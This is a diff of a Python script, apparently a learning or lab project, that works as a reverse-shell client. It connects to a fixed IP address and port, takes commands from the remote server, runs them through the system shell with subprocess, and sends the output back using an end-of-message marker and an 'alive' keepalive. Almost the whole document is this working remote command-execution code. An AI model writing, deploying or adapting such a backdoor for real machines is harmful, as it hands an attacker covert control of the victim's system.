@@ -3,42 +3,50 @@ import os
 import subprocess
 import sys
 
-s = socket.socket()
-ip = "192.168.231.158"
-port = 999
+def receive_command(s):
+    data = ""
+    while True:
+        chunk = s.recv(1024).decode("utf-8")
+        data += chunk
+        if "<EOM488965>" in data:
+            break
+    return data.replace("<EOM488965>", "")
 
-s.connect((ip, port))
+def main():
+    ip = "192.168.231.158"
+    port = 999
+    s = socket.socket()
+    s.connect((ip, port))
 
-while True:
-    data = s.recv(1024)
+    while True:
+        data = receive_command(s)
 
-    #take first 2 characters of data, decode and check is the command cd has been entered
-    if data[:2].decode("utf-8") == 'cd':
-        #if true, from character 3 onwards - change directory to that, decode first! 
-        os.chdir(data[3:].decode("utf-8"))
-    
+        if data == 'exit':
+            s.close()
+            sys.exit()
 
-    if data[:4].decode("utf-8") == 'exit':
-        #if true, from character 4 onwards - close socket and exit, decode first! 
-        s.close()
-        sys.exit()
-    #if data[:].decode("utf-8") == 'hash':
-        
+        if data == 'alive':
+            s.send(str.encode('alive<EOM488965>'))
 
-    if len(data) > 0:
-        if data.decode("utf-8") == ' ':
-            pass
-        else:
-            #shell=True gives access to shell commands
-            #stderr=subprocess.PIPE: This parameter is used to redirect and capture the standard error output of the executed command. By setting stderr=subprocess.PIPE, the error output of the command will be captured and made available through the stderr attribute of the subprocess.Popen object
-            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-            
-            #output of stdout, stdin, stderr is bytes so need to decode to read, so utf-8 decode required to print cmds to screen
-            output_b = cmd.stdout.read()
-            output_s = str(output_b, "utf-8")
-            
-            #cwd = os.getcwd() + " "
-            print(str.encode(output_s))
-            s.send(str.encode(output_s))
+        elif len(data) > 0:
+            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            output = cmd.stdout.read()
+            s.send(output + b"<EOM488965>")
 
-            print("The command sent from server was: {}".format(data[:].decode("utf-8")))
+            print("The command sent from server was: " + data)
+
+if __name__ == '__main__':
+    main()
+
+'''
+#take first 2 characters of data, decode and check is the command cd has been entered
+if data.startswith("cd"):
+    #if true, from character 3 onwards - change directory to that, decode first! 
+    os.chdir(data[3:].decode("utf-8"))
+
+if data[:4].decode("utf-8") == 'exit':
+    #if true, from character 4 onwards - close socket and exit, decode first! 
+    s.close()
+    sys.exit()
+#if data[:].decode("utf-8") == 'hash':
+'''
